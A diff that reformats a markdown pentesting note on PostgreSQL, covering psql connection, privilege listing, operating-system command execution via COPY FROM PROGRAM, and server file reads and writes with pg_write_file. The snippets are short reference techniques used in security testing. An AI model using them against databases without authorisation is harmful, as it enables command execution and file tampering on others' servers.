@@ -3,18 +3,29 @@ tags:
   - "#type/tech-specific"
 ---
 # Fundamentals
-## Manual connection
+
+## Manual Connection
+
 The tool `psql`can be used.
+
 connect to database: `psql -h 192.168.x.x -p 5432 -U user -d database`
+
 list databases: `psql -h 192.168.x.x -p 5432 -U user -l`
+
 In the psql session:
+
 show roles of current user: `\du`
+
 list privileges on tables: `\dp`
+
 show databases: `\l`
+
 # Pentesting
 
-### List permissions
+### List Permissions
+
 To list the actual users permissions:
+
 ```sql
 SELECT   
       r.rolname,   
@@ -33,19 +44,25 @@ FROM pg_catalog.pg_roles r
 ORDER BY 1;
 ```
 
-### Command execution
+### Command Execution
+
 Required privileges:
+
 - `pg_execute_server_program` - allow executing commands directly into the operating system.
 
-Use the postgresql specific `COPY` clause to execute  system commands
+Use the postgresql specific `COPY` clause to execute system commands
+
 ```sql
 DROP TABLE IF EXISTS cmd_output;
 CREATE TABLE cmd_output(line text);
 COPY cmd_output FROM PROGRAM 'whoami';
 SELECT * FROM cmd_output;
 ```
-### File access
+
+### File Access
+
 Required privileges
+
 - `pg_read_server_files` - allows reading files
 - `pg_write_server_files` - allows writing to files
 
@@ -58,5 +75,7 @@ SELECT * FROM read_files;
 ```
 
 to write files use :
+
 `SELECT pg_write_file('/var/test.txt','testcontent');`
+
 # Hardening
